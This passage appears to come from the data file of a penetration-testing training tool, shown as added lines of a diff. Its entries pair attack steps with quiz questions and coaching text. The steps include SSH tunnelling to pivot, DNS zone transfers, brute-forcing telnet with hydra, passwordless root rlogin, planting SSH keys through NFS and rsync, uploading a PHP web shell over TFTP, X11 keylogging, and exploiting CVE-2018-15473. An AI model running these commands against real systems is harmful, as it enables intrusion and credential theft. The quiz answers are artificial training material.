+        "local-linux-routes": "Enumerate Linux routes targets a different precondition; here the direct move is Sweep the Adjacent Hosts.",
+        "local-linux-neighbors": "Enumerate Linux ARP neighbors targets a different precondition; here the direct move is Sweep the Adjacent Hosts."
+      }
+    },
+    "pivot-reach-listener": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once an internal-only service bound to 127.0.0.1 on the pivot. The key confirmation is: You reach a service the box only exposed on localhost.",
+      "cmd": "ssh -L {{local_port}}:127.0.0.1:{{listener_port}} -N {{user}}@{{target}}",
+      "tool": "ssh",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "You reach a service the box only exposed on localhost.",
+      "leadup": [
+        {
+          "key": "dualhomed",
+          "label": "You discovered a second internal subnet on a compromised host",
+          "steps": [
+            {
+              "title": "Check network interfaces on the pivot host",
+              "tool": "ip",
+              "where": "target",
+              "cmd": "ip -br a",
+              "out": "lo               UNKNOWN        127.0.0.1/8\neth0             UP             10.10.10.10/24\neth1             UP             172.16.5.5/24",
+              "sig": "172.16.5.5/24",
+              "teach": "The second interface (172.16.5.5/24) or a localhost-only port is unreachable directly from Kali without a tunnel."
+            }
+          ]
+        },
+        {
+          "key": "localport",
+          "label": "An internal service is bound to 127.0.0.1",
+          "steps": [
+            {
+              "title": "List localhost listeners on the target",
+              "tool": "ss",
+              "where": "target",
+              "cmd": "ss -tulpn",
+              "out": "tcp   LISTEN 0      128    127.0.0.1:8080      0.0.0.0:*",
+              "sig": "127.0.0.1:8080",
+              "teach": "Forwarding 127.0.0.1:8080 back to Kali lets you attack the internal service with your full toolkit."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Reach an Internal-Only Service, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "ssh -L localport:127.0.0.1:listenerport brings that loopback-only service to your Kali.",
+            "demo": [
+              {
+                "run": "ssh -L {{local_port}}:127.0.0.1:{{listener_port}} -N {{user}}@{{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You reach a service the box only exposed on localhost."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "nmap -sV against 127.0.0.1:localport fingerprints it.",
+            "demo": [
+              {
+                "run": "nmap -sV -Pn -p {{local_port}} 127.0.0.1",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You identify the internal-only service."
+          }
+        ]
+      },
+      "situation": "Scenario: An internal-only service bound to 127.0.0.1 on the pivot. Which move should you run next?",
+      "choices": [
+        "pivot-reach-listener",
+        "local-linux-interfaces",
+        "local-linux-routes",
+        "local-linux-neighbors"
+      ],
+      "coach": {
+        "local-linux-interfaces": "Enumerate Linux interfaces targets a different precondition; here the direct move is Reach an Internal-Only Service.",
+        "local-linux-routes": "Enumerate Linux routes targets a different precondition; here the direct move is Reach an Internal-Only Service.",
+        "local-linux-neighbors": "Enumerate Linux ARP neighbors targets a different precondition; here the direct move is Reach an Internal-Only Service."
+      }
+    },
+    "pivot-internal-dns": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once when you can query the internal resolver and want to find the DC. The key confirmation is: The DC or DCs are named.",
+      "cmd": "dig @{{dns_server}} -t SRV _ldap._tcp.dc._msdcs.{{domain}}",
+      "tool": "dig",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The DC or DCs are named.",
+      "leadup": [
+        {
+          "key": "dualhomed",
+          "label": "You discovered a second internal subnet on a compromised host",
+          "steps": [
+            {
+              "title": "Check network interfaces on the pivot host",
+              "tool": "ip",
+              "where": "target",
+              "cmd": "ip -br a",
+              "out": "lo               UNKNOWN        127.0.0.1/8\neth0             UP             10.10.10.10/24\neth1             UP             172.16.5.5/24",
+              "sig": "172.16.5.5/24",
+              "teach": "The second interface (172.16.5.5/24) or a localhost-only port is unreachable directly from Kali without a tunnel."
+            }
+          ]
+        },
+        {
+          "key": "localport",
+          "label": "An internal service is bound to 127.0.0.1",
+          "steps": [
+            {
+              "title": "List localhost listeners on the target",
+              "tool": "ss",
+              "where": "target",
+              "cmd": "ss -tulpn",
+              "out": "tcp   LISTEN 0      128    127.0.0.1:8080      0.0.0.0:*",
+              "sig": "127.0.0.1:8080",
+              "teach": "Forwarding 127.0.0.1:8080 back to Kali lets you attack the internal service with your full toolkit."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Interrogate the Internal Resolver, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "dig for the _ldap._tcp.dc._msdcs SRV record points you at the domain controllers.",
+            "demo": [
+              {
+                "run": "dig @{{dns_server}} -t SRV _ldap._tcp.dc._msdcs.{{domain}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The DC or DCs are named."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "dig AXFR. If it is allowed, you get the whole internal map.",
+            "demo": [
+              {
+                "run": "dig @{{dns_server}} AXFR {{domain}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A successful AXFR hands you the internal namespace."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "nslookup -type=SRV for the same DC record.",
+            "demo": [
+              {
+                "run": "nslookup -type=SRV _ldap._tcp.dc._msdcs.{{domain}} {{dns_server}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The DC is identified from a Windows host."
+          }
+        ]
+      },
+      "situation": "Scenario: When you can query the internal resolver and want to find the DC. Which move should you run next?",
+      "choices": [
+        "pivot-internal-dns",
+        "local-linux-interfaces",
+        "local-linux-routes",
+        "local-linux-neighbors"
+      ],
+      "coach": {
+        "local-linux-interfaces": "Enumerate Linux interfaces targets a different precondition; here the direct move is Interrogate the Internal Resolver.",
+        "local-linux-routes": "Enumerate Linux routes targets a different precondition; here the direct move is Interrogate the Internal Resolver.",
+        "local-linux-neighbors": "Enumerate Linux ARP neighbors targets a different precondition; here the direct move is Interrogate the Internal Resolver."
+      }
+    },
+    "vnc-desktop-shell": {
+      "why": "You already have the target desktop in front of you. This turns that desktop into a real command shell, the foothold you need to start hunting the flag. In practice, you reach for this step when once you have an unauthenticated or cracked VNC desktop and want a shell. Success looks like: You are at the live desktop with a terminal open.",
+      "cmd": "vncviewer {{target}}::5900",
+      "tool": "vncviewer",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "You are at the live desktop with a terminal open.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "You already have the target desktop in front of you.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Connect, add -passwd pass.txt for a cracked password, then open a terminal on the desktop.",
+            "demo": [
+              {
+                "run": "vncviewer {{target}}::5900",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You are at the live desktop with a terminal open."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run it in the desktop terminal, not on Kali, and screenshot the whole window.",
+            "demo": [
+              {
+                "run": "id; hostname; ip -4 addr | grep inet",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Your user, hostname, and target IP print together in the frame."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "VNC uses a static DES key to obfuscate stored passwords; vncpwd reverses it instantly.",
+            "demo": [
+              {
+                "run": "vncpwd -s {{vnc_hex_pass}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The obfuscated VNC hex password decrypts to cleartext."
+          }
+        ]
+      },
+      "situation": "Scenario: Once you have an unauthenticated or cracked VNC desktop and want a shell. Which move should you run next?",
+      "choices": [
+        "vnc-desktop-shell",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is VNC Desktop to Shell.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is VNC Desktop to Shell.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is VNC Desktop to Shell."
+      }
+    },
+    "nfs-to-foothold": {
+      "why": "You are turning a shared NFS folder into an actual login, usually by reading or planting an SSH key. That gives you a foothold to hunt the flag from. In practice, you reach for this step when when an export is world-shared and you want a foothold, not just loot. Success looks like: A world-shared export shows in the list.",
+      "cmd": "showmount -e {{target}}",
+      "tool": "showmount",
+      "output": "Export list for {{target}}:\n/var/nfsshare *\n/home/bob     10.10.10.0/24",
+      "signal": "/var/nfsshare",
+      "teach": "A world-shared export shows in the list.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "You are turning a shared NFS folder into an actual login, usually by reading or planting an SSH key.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "List the exports and who they are shared with. An export open to everyone (*) is the lead.",
+            "demo": [
+              {
+                "run": "showmount -e {{target}}",
+                "out": "Export list for {{target}}:\n/var/nfsshare *\n/home/bob     10.10.10.0/24",
+                "sig": "/var/nfsshare"
+              }
+            ],
+            "note": "A world-shared export shows in the list."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Mount the export, then either read a private key to log in with, or match the owner UID locally and write your authorized_keys. Then connect over SSH and run id.",
+            "demo": [
+              {
+                "run": "sudo mount -t nfs {{target}}:{{export}} /mnt/nfs -o nolock",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "An SSH login lands a shell and id shows the expected user."
+          }
+        ]
+      },
+      "situation": "Scenario: When an export is world-shared and you want a foothold, not just loot. Which move should you run next?",
+      "choices": [
+        "nfs-to-foothold",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is NFS Export to Shell.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is NFS Export to Shell.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is NFS Export to Shell."
+      }
+    },
+    "telnet-login": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: A prompt appears and the identity commands print your user and the target IP.",
+      "cmd": "telnet {{target}} 23",
+      "tool": "telnet",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "A shell prompt appears and the identity commands print your user and the target IP.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "You hold a username and password, and telnet is a login shell, so logging in here is the foothold you need to start finding the flag.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Log in, then run id, hostname, and ip -4 addr together so the shell and host identity land in one frame.",
+            "demo": [
+              {
+                "run": "telnet {{target}} 23",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A shell prompt appears and the identity commands print your user and the target IP."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "No credential yet? Brute it - telnet boxes lean on weak/default logins. A [23][telnet] host: ... login: ... password: ... line is your way in; then use the first command.",
+            "demo": [
+              {
+                "run": "hydra -L {{userlist}} -P {{wordlist}} telnet://{{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A valid login and password print, which log you into a shell."
+          }
+        ]
+      },
+      "situation": "Scenario: Once you hold a credential (a default, a spray hit, or a reused password). Which move should you run next?",
+      "choices": [
+        "telnet-login",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is Log In Over Telnet.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is Log In Over Telnet.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is Log In Over Telnet."
+      }
+    },
+    "rservices-login": {
+      "why": "You are using that trust to log in with no password, often straight to a root shell, which can be the whole box in a single step. In practice, you reach for this step when when recon showed the r-service ports and you want the foothold. Success looks like: A shell opens with no password and id shows your user.",
+      "cmd": "rlogin -l root {{target}}",
+      "tool": "rlogin",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "A shell opens with no password and id shows your user.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "You are using that trust to log in with no password, often straight to a root shell, which can be the whole box in a single step.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Try root first, then each enumerated user. Run id and hostname to capture it.",
+            "demo": [
+              {
+                "run": "rlogin -l root {{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A shell opens with no password and id shows your user."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "The rsh form runs a single command across the trust; `uid=0(root)` confirms a passwordless root foothold.",
+            "demo": [
+              {
+                "run": "rsh {{target}} -l root id",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The command returns the root identity."
+          }
+        ]
+      },
+      "situation": "Scenario: When recon showed the r-service ports and you want the foothold. Which move should you run next?",
+      "choices": [
+        "rservices-login",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is Log In via r-services (rlogin/rsh).",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is Log In via r-services (rlogin/rsh).",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is Log In via r-services (rlogin/rsh)."
+      }
+    },
+    "rsync-write-shell": {
+      "why": "A writable rsync folder that lands in the right place lets you plant an SSH key and log in, turning file-write access into a real foothold. In practice, you reach for this step when when a module looks writable and maps onto a sensitive path. Success looks like: A module accepts a test upload.",
+      "cmd": "rsync rsync://{{target}}/",
+      "tool": "rsync",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "A module accepts a test upload.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A writable rsync folder that lands in the right place lets you plant an SSH key and log in, turning file-write access into a real foothold.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "List the modules. A module marked writable (or one you can push a test file to) is the lead.",
+            "demo": [
+              {
+                "run": "rsync rsync://{{target}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A module accepts a test upload."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Push authorized_keys into the module .ssh path, then connect over SSH and run id.",
+            "demo": [
+              {
+                "run": "rsync -av ./authorized_keys rsync://{{target}}/{{module}}/.ssh/authorized_keys",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The upload succeeds and the SSH login lands a shell."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Point the key file and user at what you just wrote.",
+            "demo": [
+              {
+                "run": "ssh -i {{keyfile}} {{user}}@{{target}} id",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "id prints over SSH, confirming the foothold."
+          }
+        ]
+      },
+      "situation": "Scenario: When a module looks writable and maps onto a sensitive path. Which move should you run next?",
+      "choices": [
+        "rsync-write-shell",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is Rsync Writable Module to Shell.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is Rsync Writable Module to Shell.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is Rsync Writable Module to Shell."
+      }
+    },
+    "tftp-write-shell": {
+      "why": "If you can write a file where the web server will run it, you turn the no-login TFTP upload into code execution, which is a foothold. In practice, you reach for this step when when the TFTP root is a writable, served directory. Success looks like: The follow-up request returns the file, proving the write landed somewhere served.",
+      "cmd": "tftp {{target}} -c put shell.php",
+      "tool": "tftp",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The follow-up request returns the file, proving the write landed somewhere served.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "If you can write a file where the web server will run it, you turn the no-login TFTP upload into code execution, which is a foothold.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Upload a file whose language matches the site, then verify by requesting it in the next step.",
+            "demo": [
+              {
+                "run": "tftp {{target}} -c put shell.php",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The follow-up request returns the file, proving the write landed somewhere served."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Request the uploaded file to run one command. Start your catcher first (the Shells lane sets one up) before a reverse shell.",
+            "demo": [
+              {
+                "run": "curl \"http://{{target}}/shell.php?c=id\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The command output returns in the HTTP response."
+          }
+        ]
+      },
+      "situation": "Scenario: When the TFTP root is a writable, served directory. Which move should you run next?",
+      "choices": [
+        "tftp-write-shell",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is TFTP Write to Shell.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is TFTP Write to Shell.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is TFTP Write to Shell."
+      }
+    },
+    "x11-keylog": {
+      "why": "You are watching the screen and keystrokes to catch a password as it is typed, including the sudo password, which can take you all the way to root. In practice, you reach for this step when when an open X11 display becomes a credential oracle. Success looks like: screen.png reveals on-screen content, sometimes a credential.",
+      "cmd": "xwd -root -display {{target}}:0 -out screen.xwd && convert screen.xwd screen.png",
+      "tool": "xwd",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "screen.png reveals on-screen content, sometimes a credential.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "You are watching the screen and keystrokes to catch a password as it is typed, including the sudo password, which can take you all the way to root.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Grab the current screen - terminals, password managers and chat windows routinely show secrets. Eyeball screen.png.",
+            "demo": [
+              {
+                "run": "xwd -root -display {{target}}:0 -out screen.xwd && convert screen.xwd screen.png",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "screen.png reveals on-screen content, sometimes a credential."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Log keystrokes from the session. Watch for the sudo/su password being typed; that single capture is often the whole path to root. Paste what you capture and obol records the candidate credential.",
+            "demo": [
+              {
+                "run": "xspy {{target}}:0",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Typed keystrokes stream out."
+          }
+        ]
+      },
+      "situation": "Scenario: When an open X11 display becomes a credential oracle. Which move should you run next?",
+      "choices": [
+        "x11-keylog",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is X11 Keylog / Screen Capture to Credentials.",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is X11 Keylog / Screen Capture to Credentials.",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is X11 Keylog / Screen Capture to Credentials."
+      }
+    },
+    "ssh-user-enum": {
+      "why": "An old SSH version leaks which usernames are real. That turns a hopeless blind password guess into a targeted one against accounts you know exist. In practice, you reach for this step when when 22 is open and you want to turn a blind brute into a targeted one. Success looks like: nmap prints the OpenSSH version.",
+      "cmd": "python3 cve-2018-15473.py --userList users.txt 10.10.10.10",
+      "tool": "python3",
+      "output": "[+] root is a valid user\n[-] admin is not a valid user\n[+] administrator is a valid user\n[+] j.smith is a valid user",
+      "signal": "[+] administrator is a valid user",
+      "teach": "Three names came back valid and one did not. Spray a seasonal or leaked password only against root, administrator, and j.smith, not the whole list, so you stay under the lockout and the noise floor.",
+      "leadup": [
+        {
+          "key": "banner",
+          "label": "The banner is pre-7.7",
+          "steps": [
+            {
+              "title": "Read the SSH version",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "nc <target> 22",
+              "out": "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8",
+              "sig": "OpenSSH_7.2p2",
